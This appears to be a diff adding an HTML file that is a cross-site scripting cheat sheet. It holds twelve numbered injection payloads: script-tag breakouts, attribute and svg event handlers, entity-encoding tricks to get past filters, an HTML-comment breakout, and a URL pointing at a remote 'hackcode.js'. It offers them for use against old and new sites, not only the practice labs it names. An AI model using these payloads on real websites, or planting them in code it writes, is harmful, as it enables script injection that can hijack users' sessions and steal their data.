@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+
+<!-- 
+	NOTE: Below Code Scripts are for the XSS Attack Basic Scripts may have work on some old version sites and some of the new sites!
+-->
+
+<!-- 
+	Test Lab Urls:
+	http://securityidiots.com/
+	http://leettime.net/
+	https://www.google.com/about/appsecurity/learning/xss/index.html
+-->
+
+
+Test 1
+Payload => <script type="text/javascript">alert(document.URL);</script>
+
+Test 2
+Payload => ><script type="text/javascript">alert(document.URL);</script>
+
+
+Test 3
+Payload => "><script type="text/javascript">alert(document.URL);</script>
+
+Test 4
+Payload => '><script type="text/javascript">alert(document.URL);</script>
+
+Test 5
+Payload => ";</script><script type="text/javascript">alert(document.URL);</script>
+
+Test 6
+Payload => ';</script><script type="text/javascript">alert(document.URL);</script>
+
+Test 7
+Payload => 'onmouseover='alert(document.URL)'
+
+Test 8 
+If page not allow you to enter your code or start filtering it by anoter code!
+Payload => <svg/onload="alert('hello')"
+
+Test 9 Charchter Encoding
+	If page filter convert starting paranthesis or any other symbol then use number encoding for that.
+	Use W3 school for getting know about number to UTF-8 conversaction!
+	like for "(" => &#40;
+Payload => <svg><script type="text/javascript">alert&#40"hacked");</script>	
+
+Test 10
+	If you want to add data script into comment then use
+Payload => --!> <script>alert()</script>
+
+Test 11
+	Some of the sites need to retrive url as parameter so that can take url as parameter so provide script file url as parameter!'
+Payload => https://humbingo.com/js/hackcode.js
+
+
+Test 12 
+	If input fields are not working properly with the code then add custom payloads and use enter or tabs as per requirenment!
+
+Payload => "type="image"  src onerror 
+			="alert('hacked')
+
+
+
+
+</body>
+</html>
